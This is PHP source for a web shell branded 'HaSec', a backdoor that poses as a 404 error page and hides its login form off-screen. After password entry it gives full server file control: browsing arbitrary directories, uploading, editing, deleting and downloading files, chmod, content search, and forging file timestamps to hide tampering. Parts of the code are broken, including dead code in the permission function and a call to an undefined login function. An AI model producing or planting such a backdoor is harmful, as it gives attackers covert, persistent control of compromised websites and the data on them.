<?php
session_start();

function display_404_page() {
    header("HTTP/1.0 404 Not Found");
    echo '<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            input[type="password"] {
                position: absolute; /* Memposisikan kolom secara absolut */
                left: -9999px; /* Menempatkannya di luar tampilan */
                width: 1px; /* Lebar sangat kecil */
                height: 1px; /* Tinggi sangat kecil */
                opacity: 0; /* Membuatnya tidak terlihat */
            }
            input[type="submit"] {
                padding: 5px; 
                width: 5%; /* Menyusutkan lebar tombol */
                background-color: white; /* Mengubah tombol menjadi putih */
                color: white; /* Mengubah warna teks menjadi putih */
                border: none; /* Menghapus border */
                border-radius: 5px; /* Membuat sudut membulat */
                cursor: pointer; /* Mengubah kursor saat hover */
            }
            .login-container {
                position: absolute; /* Memposisikan form secara absolut */
                top: 20px; /* Jarak dari atas */
                right: 20px; /* Jarak dari kanan */
                text-align: right; /* Mengatur teks ke kanan */
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
            <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
            <div class="login-container">
                <form action="" method="post">
                    <input type="password" name="pass" placeholder="" style="color: #2d3748;">
                    <input type="submit" value="Submit">
                </form>
            </div>
        </div>
    </body>
    </html>';
    exit();
}

$password_default = '$2y$12$6k6TtOuQmyD0ylpSsapE.ufdfOiJLw5uUx5XEMvodnVdLTsndn1ta'; 

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_default)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        display_404_page();
    }
}
session_start();
$password_default = '$2y$10$t8hAKHjhB.xRvv7pIIOOte9eq8Y/AcDXlvAKSSXKYfkQj6/YR3Mf2'; 
$timeout_duration = 15 * 60; 

if (isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY']) > $timeout_duration) {
        session_unset();    
        session_destroy();  
        login_shell();      
    }
    $_SESSION['LAST_ACTIVITY'] = time(); 
} else {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_default)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
        $_SESSION['LAST_ACTIVITY'] = time(); 
    } else {
        login_shell(); 
    }
}
$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir;
}

function getFilePermissions($file) {
    return sprintf("%04o", fileperms($file) & 0777);
    if (($perms & 0xC000) == 0xC000) { // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) { // Symlink
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) { // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) { // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) { // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) { // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) { // FIFO pipe
        $info = 'p';
    } else {
        $info = 'u'; // Unknown
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-') .
             (($perms & 0x0080) ? 'w' : '-') .
             (($perms & 0x0040) ? 'x' : '-');

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-') .
             (($perms & 0x0010) ? 'w' : '-') .
             (($perms & 0x0008) ? 'x' : '-');

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-') .
             (($perms & 0x0002) ? 'w' : '-') .
             (($perms & 0x0001) ? 'x' : '-');

    return $info;
}

if (isset($_POST['change_permission'])) {
    $file_to_change = $current_dir . '/' . $_POST['file_name'];
    $new_permission = $_POST['new_permission'];

    if (is_file($file_to_change) || is_dir($file_to_change)) {
        chmod($file_to_change, octdec($new_permission)); 
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

function listDirectory($dir) {
    $files = scandir($dir);
    $directories = [];
    $regular_files = [];

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;
            } else {
                $regular_files[] = $file;
            }
        }
    }

    foreach ($directories as $directory) {
        $dir_path = $dir . '/' . $directory;
        $mod_time = date("Y-m-d H:i", filemtime($dir_path));
        $permissions = getFilePermissions($dir_path); 
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir_path) . '">📁 ' . htmlspecialchars($directory) . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>' . $mod_time . '</td>'; 
        echo '<td>' . $permissions . '</td>'; 
        echo '<td>
            <form method="post" style="display:inline;">
                <textarea name="datetime" rows="1" cols="15" placeholder="YYYY-MM-DD HH:MM"></textarea>
                <input type="hidden" name="file_name" value="' . htmlspecialchars($directory) . '">
                <button type="submit" name="update_datetime">Set Date</button>
            </form>
            <span style="margin: 0 2px;">|</span>
            <form method="post" style="display:inline;">
                <input type="text" name="new_permission" placeholder="Chmod" required style="width: 40px;">
                <input type="hidden" name="file_name" value="' . htmlspecialchars($directory) . '">
                <button type="submit" name="change_permission">Set Chmod</button>
            </form>
            <span style="margin: 0 5px;">|</span>
            </form>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a> |
			            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a>
        </td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        $file_path = $dir . '/' . $file;
        $mod_time = date("Y-m-d H:i", filemtime($file_path));
        $permissions = getFilePermissions($file_path);
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">' . htmlspecialchars($file) . '</a></td>';
        echo '<td>' . filesize($file_path) . ' bytes</td>';
        echo '<td>' . $mod_time . '</td>'; 
        echo '<td>' . $permissions . '</td>'; 
        echo '<td>
            <form method="post" style="display:inline;">
                <textarea name="datetime" rows="1" cols="10" placeholder="YYYY-MM-DD HH:MM"></textarea>
                <input type="hidden" name="file_name" value="' . htmlspecialchars($file) . '">
                <button type="submit" name="update_datetime">Set Date</button>
            </form>
            <span style="margin: 0 2px;">|</span>
            <form method="post" style="display:inline;">
                <input type="text" name="new_permission" placeholder="Chmod" required style="width: 40px;">
                <input type="hidden" name="file_name" value="' . htmlspecialchars($file) . '">
                <button type="submit" name="change_permission">Set Chmod</button>
            </form>
            <span style="margin: 0 5px;">|</span>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a>
        </td>';
        echo '</tr>';
    }
}

function deleteFileOrFolder($file_to_delete) {
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    } elseif (is_dir($file_to_delete)) {
        rmdir($file_to_delete); 
    }
}

if (isset($_GET['delete'])) {
    deleteFileOrFolder($current_dir . '/' . $_GET['delete']);
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    if (file_exists($old_name)) {
        rename($old_name, $new_name);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_POST['create_folder'])) {
    $new_folder_name = trim($_POST['new_folder_name']);
    $new_folder_path = $current_dir . '/' . $new_folder_name;

    // Validasi input
    if (!empty($new_folder_name)) {
        // Sanitasi nama folder
        $new_folder_name = preg_replace('/[^a-zA-Z0-9_\-]/', '', $new_folder_name);
        $new_folder_path = $current_dir . '/' . $new_folder_name;

        // Cek apakah folder sudah ada
        if (!is_dir($new_folder_path)) {
            if (mkdir($new_folder_path)) {
                echo "<script>alert('Folder created successfully!');</script>";
            } else {
                echo "<script>alert('Failed to create folder.');</script>";
            }
        } else {
            echo "<script>alert('Folder already exists!');</script>";
        }
    } else {
        echo "<script>alert('Folder name cannot be empty!');</script>";
    }

    // Redirect dengan aman
    $redirect_dir = isset($_GET['dir']) ? $_GET['dir'] : $root_dir;
    header("Location: ?dir=" . urlencode($redirect_dir));
    exit;
}

if (isset($_POST['update_datetime'])) {
    $file_to_update = $current_dir . '/' . $_POST['file_name'];
    $new_datetime = $_POST['datetime'];

    // Validasi input
    if (file_exists($file_to_update) && !empty($new_datetime)) {
        $timestamp = strtotime($new_datetime);
        if ($timestamp !== false) {
            touch($file_to_update, $timestamp);
        }
    }

    // Redirect dengan aman
    $redirect_dir = isset($_GET['dir']) ? $_GET['dir'] : $root_dir;
    header("Location: ?dir=" . urlencode($redirect_dir));
    exit;
}

function searchInFiles($dir, $search_string) {
    $results = [];
    $files = scandir($dir);

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $file_path = $dir . '/' . $file;
            if (is_dir($file_path)) {
                $results = array_merge($results, searchInFiles($file_path, $search_string));
            } else {
                if (is_readable($file_path) && strpos(file_get_contents($file_path), $search_string) !== false) {
                    $results[] = $file_path;
                }
            }
        }
    }
    return $results;
}

function searchFiles($dir, $file_name) {
    $results = [];
    $files = scandir($dir);

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $file_path = $dir . '/' . $file;
            if (is_dir($file_path)) {
                $results = array_merge($results, searchFiles($file_path, $file_name));
            } elseif (stripos($file, $file_name) !== false) { 
                $results[] = $file_path;
            }
        }
    }
    return $results;
}

if (isset($_POST['search'])) {
    $search_string = $_POST['search_string'];
    $search_results = searchInFiles($current_dir, $search_string);
}

if (isset($_POST['search_file_name'])) {
    $file_name = $_POST['file_name'];
    $file_search_results = searchFiles($current_dir, $file_name);
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HaSec</title>
    <style>
        body {
            font-size: 0.8em; 
            line-height: 1.5; 
            background-image: url('https://pub-48d045925b6b4bd8acbbee8bc3239c3a.r2.dev/137.jpeg'); 
            background-size: cover; 
            background-repeat: no-repeat; 
            background-position: center; 
            background-attachment: fixed; 
            height: 100vh; 
            margin: 0; 
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            font-size: inherit; 
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: rgba(34, 34, 34, 0.5);
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: rgba(34, 34, 34, 0.5);
        }
        tr:nth-child(odd) {
            background-color: rgba(34, 34, 34, 0.5);
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: rgba(34, 34, 34, 0.3);
            color: #34ebeb;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 10%;
            height: 15;
            background-color: rgba(34, 34, 34, 0.5);
            color: #E0E0E0;
            border: 1px solid #BB86FC;
            resize: none;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: rgba(34, 34, 34, 0.5);
            border: 1px solid #BB86FC;
            padding: 5px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .form-container form {
            margin-right: 5px;
        }
    </style>
</head>
<body>
<a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
    <img src="https://i.ibb.co.com/3Tf4qpb/11899-2650d7c8ea2054bb6892613de22b6bf1-22-10-2024-04-26-03.png" alt="Dunk" style="width: 150px; height: auto; margin-bottom: 0px;">
</a>
<div style="display: flex; align-items: center; margin-bottom: 10px;">
    <a href="?dir=<?php echo urlencode($root_dir); ?>" class="mr-10 white" style="background-color: transparent; color: #03DAC6; padding: 5px 10px; text-decoration: none; margin-right: 10px; border: 2px solid #03DAC6;"> HOME </a>
    <form method="get" style="display: flex; align-items: center;">
        <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="width: 350px; margin-right: 10px;">
        <button type="submit">Go</button>
    </form>
</div>

    <div class="form-container">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" name="upload">Upload</button>
        </form>

<div style="margin-left: 50px; margin-top: -40px; display: flex; flex-wrap: wrap; gap: 20px;">
    <div style="display: flex; flex-direction: column;">
        <form method="post" style="display: flex; align-items: center; margin-bottom: 10px;">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file" style="margin-left: 5px;">Create File</button>
        </form>

        <form method="post" style="display: flex; align-items: center; margin-bottom: 10px;">
            <input type="text" name="new_folder_name" placeholder="New folder name" required>
            <button type="submit" name="create_folder" style="margin-left: 5px;">Create Folder</button>
        </form>
    </div>

    <div style="display: flex; flex-direction: column;">
        <form method="post" style="display: flex; align-items: center; margin-bottom: 10px;">
            <input type="text" name="search_string" placeholder="Search string" required style="flex: 1;">
            <button type="submit" name="search" style="margin-left: 5px;">Search</button>
        </form>

        <form method="post" style="display: flex; align-items: center;">
            <input type="text" name="file_name" placeholder="Search file name" required style="flex: 1;">
            <button type="submit" name="search_file_name" style="margin-left: 5px;">Search</button>
        </form>
    </div>
</div>



    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Permission</th>
                <th style="text-align: center;">Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <?php if (isset($search_results) && count($search_results) > 0): ?>
        <h3>Search Results for "<?php echo htmlspecialchars($search_string); ?>":</h3>
        <ul>
            <?php foreach ($search_results as $result): ?>
                <li>
                    <?php echo htmlspecialchars($result); ?>
                    <a href="?dir=<?php echo urlencode(dirname($result)); ?>&view=<?php echo urlencode(basename($result)); ?>">View</a>
                </li>
            <?php endforeach; ?>
        </ul>
    <?php elseif (isset($search_results)): ?>
        <h3>No results found for "<?php echo htmlspecialchars($search_string); ?>".</h3>
    <?php endif; ?>
    
    <?php if (isset($file_search_results) && count($file_search_results) > 0): ?>
        <h3>Search Results for "<?php echo htmlspecialchars($file_name); ?>":</h3>
        <ul>
            <?php foreach ($file_search_results as $result): ?>
                <li>
                    <?php echo htmlspecialchars($result); ?>
                    <a href="?dir=<?php echo urlencode(dirname($result)); ?>&view=<?php echo urlencode(basename($result)); ?>">View</a>
                </li>
            <?php endforeach; ?>
        </ul>
    <?php elseif (isset($file_search_results)): ?>
        <h3>No results found for "<?php echo htmlspecialchars($file_name); ?>".</h3>
    <?php endif; ?>

    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 150px; padding: 10px;" required>
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <?php if (isset($_GET['edit'])): ?>
        <?php
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
        ?>
        <form method="post">
            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
            <textarea name="file_content" style="width: 99%; height: 300px;"><?php echo htmlspecialchars($file_content); ?></textarea>
            <br>
            <button type="submit" name="save_file">Save Changes</button>
        </form>
        <?php } ?>
    <?php endif; ?>

<?php if (isset($_GET['view'])): ?>
    <?php
    $file_to_view = $current_dir . '/' . $_GET['view'];
    if (is_file($file_to_view)) {
        $file_content = file_get_contents($file_to_view);
    ?>
    <h3>File Content of "<?php echo htmlspecialchars($_GET['view']); ?>":</h3>
    <textarea readonly rows="10" style="width: 100%;"><?php echo htmlspecialchars($file_content); ?></textarea>
    
    <div>
        <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode(basename($file_to_view)); ?>">Edit</a> |
        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode(basename($file_to_view)); ?>">Delete</a>
    </div>
    <?php } ?>
<?php endif; ?>
</body>
</html>
